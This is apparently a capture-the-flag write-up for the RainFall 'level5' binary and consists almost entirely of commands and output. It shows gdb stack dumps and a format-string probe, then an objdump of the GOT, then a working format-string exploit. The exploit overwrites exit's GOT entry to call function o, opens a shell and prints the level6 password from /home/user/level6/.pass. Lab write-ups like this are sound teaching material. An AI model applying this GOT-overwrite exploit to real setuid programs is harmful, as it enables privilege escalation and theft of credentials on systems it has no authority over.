```sh
(gdb) x/80x $esp
0xbffff510:	0xbffff520	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff520:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
0xbffff530:	0xbffff588	0xb7fde2d4	0xb7fde334	0x00000007
```

```sh
level5@RainFall:~$ python -c "print('\x41\x41\x41\x41' + '%4\$x')" | ./level5 
AAAA41414141
```

```sh
level5@RainFall:~$ objdump -R level5 

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
<08049838 R_386_JUMP_SLOT   exit >
0804983c R_386_JUMP_SLOT   __libc_start_main
```

```sh
(gdb) x/x &o
0x80484a4 <o>:	0x83e58955
```

0x80484a4 = 134513828

134513828 - 4 = 134513824

```sh
(python -c "print('\x38\x98\x04\x08%134513824x%4\$n')"; cat) | ./level5
[...]
ls: cannot open directory .: Permission denied
pwd
/home/user/level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
